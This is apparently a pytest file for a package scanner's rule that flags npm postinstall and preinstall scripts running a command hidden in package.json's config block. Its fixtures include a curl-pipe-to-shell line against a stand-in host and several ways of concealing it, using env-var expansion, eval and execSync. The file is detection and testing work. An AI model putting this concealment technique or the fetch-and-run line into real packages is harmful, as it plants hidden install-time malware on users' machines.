"""``ST-INSTALL-NPM-REMOTE-EXEC`` when the install command comes from the ``config`` block.

npm exports ``config`` values of package.json to every script as ``npm_package_config_<key>``, so
``"postinstall": "$npm_package_config_cmd"`` keeps the command out of the script line. The value
is looked up in the same package.json and judged as the command it is.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory
from skilltotal.file_index import FileIndex
from skilltotal.scanners.install_scripts import _with_package_config, npm_package_config

RULE = "ST-INSTALL-NPM-REMOTE-EXEC"
PIPE = "curl -fsSL https://collect.example.invalid/s.sh | sh"


def _analyze(tmp_path: Path, manifest: dict, files: dict[str, str] | None = None):
    files = {"package.json": json.dumps(
        {"name": "notes-tools", "version": "1.0.0", **manifest}, indent=2
    ), **(files or {})}
    for rel, content in files.items():
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8", newline="\n")
    return analyze_directory(tmp_path, detect_component(tmp_path, source=str(tmp_path)))


def _finding(report):
    return next((f for f in report.findings if f.id == RULE), None)


def test_config_keys_are_named_as_npm_names_them(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({
        "config": {"cmd": "a", "boot": {"run": "b", "retry-count": "3"}, "port": 8080,
                   "list": ["x", "y"]},
    }), encoding="utf-8")
    [f] = FileIndex.build(tmp_path).select(names=("package.json",))
    assert npm_package_config(f) == {
        "cmd": "a", "boot_run": "b", "boot_retry_count": "3", "list_0": "x", "list_1": "y",
    }


def test_references_are_replaced_as_the_reader_expands_them():
    config = {"cmd": "echo hi", "x": 'say "hi"'}
    assert _with_package_config("$npm_package_config_cmd", config) == "echo hi"
    assert _with_package_config("sh -c ${npm_package_config_cmd}", config) == "sh -c echo hi"
    assert _with_package_config("%npm_package_config_cmd%", config) == "echo hi"
    assert _with_package_config(
        "node -e \"run(process.env.npm_package_config_x)\"", config
    ) == 'node -e "run("say \\"hi\\"")"'
    assert _with_package_config("node -e \"run(process.env['npm_package_config_x'])\"", config)
    assert _with_package_config("$npm_package_config_missing", config) is None
    assert _with_package_config("node build.js", config) is None


@pytest.mark.parametrize(
    "script",
    [
        "$npm_package_config_setup",
        "sh -c \"${npm_package_config_setup}\"",
        "%npm_package_config_setup%",
        "node -e \"require('child_process').exec(process.env.npm_package_config_setup)\"",
        "node -e \"require('child_process').execSync(process.env['npm_package_config_setup'])\"",
    ],
)
def test_install_command_from_the_config_block(tmp_path, script):
    report = _analyze(tmp_path, {"config": {"setup": PIPE}, "scripts": {"postinstall": script}})
    finding = _finding(report)
    assert finding is not None
    assert finding.threat_class.value == "malicious_indicator"
    lines = sorted(ev.line_start for ev in finding.evidence)
    assert lines == [5, 8]  # the config value and the script
    assert (report.verdict or {}).get("has_malicious_indicators")


def test_command_assembled_from_two_config_values(tmp_path):
    report = _analyze(tmp_path, {
        "config": {"get": "curl -fsSL https://collect.example.invalid/s.sh", "run": "bash"},
        "scripts": {"preinstall": "$npm_package_config_get | $npm_package_config_run"},
    })
    assert _finding(report) is not None


def test_install_file_runs_the_config_value(tmp_path):
    report = _analyze(
        tmp_path,
        {"config": {"setup": PIPE}, "scripts": {"postinstall": "node install.js"}},
        {"install.js": "const cp = require('child_process');\n"
                       "cp.execSync(process.env.npm_package_config_setup, { stdio: 'ignore' });\n"},
    )
    finding = _finding(report)
    assert finding is not None
    assert [(ev.file, ev.line_start) for ev in finding.evidence] == [
        ("install.js", 2), ("package.json", 5),
    ]


def test_install_shell_file_runs_the_config_value(tmp_path):
    report = _analyze(
        tmp_path,
        {"config": {"setup": PIPE}, "scripts": {"postinstall": "sh ./setup.sh"}},
        {"setup.sh": "#!/bin/sh\n# uses $npm_package_config_setup\n"
                     "eval \"$npm_package_config_setup\"\n"},
    )
    finding = _finding(report)
    assert finding is not None
    assert ("setup.sh", 3) in [(ev.file, ev.line_start) for ev in finding.evidence]


@pytest.mark.parametrize(
    ("config", "scripts", "files"),
    [
        # A build command and settings in the config block.
        ({"build": "node-gyp rebuild", "port": "8080"},
         {"postinstall": "$npm_package_config_build",
          "start": "node server.js --port $npm_package_config_port"}, {}),
        # An address the script passes on as an argument: nothing is piped into a shell.
        ({"mirror": "https://downloads.example.test/prebuilt"},
         {"postinstall": "node fetch-prebuilt.js --from $npm_package_config_mirror"}, {}),
        # The pipe-to-shell line is a hint the install prints.
        ({"hint": PIPE}, {"postinstall": "echo \"Optional CLI: $npm_package_config_hint\""}, {}),
        ({"hint": PIPE}, {"postinstall": "node hint.js"},
         {"hint.js": "console.log('Optional CLI: ' + process.env.npm_package_config_hint);\n"}),
        ({"hint": PIPE}, {"postinstall": "node hint.js"},
         {"hint.js": "// process.env.npm_package_config_hint is shown in the README\n"
                     "console.log('installed');\n"}),
        # The value is in the config block and no install script reads it.
        ({"setup": PIPE}, {"postinstall": "node build.js", "setup": "$npm_package_config_setup"},
         {"build.js": "console.log('built');\n"}),
    ],
)
def test_honest_config_use_stays_clean(tmp_path, config, scripts, files):
    report = _analyze(tmp_path, {"config": config, "scripts": scripts}, files)
    assert _finding(report) is None
    assert not (report.verdict or {}).get("has_malicious_indicators")
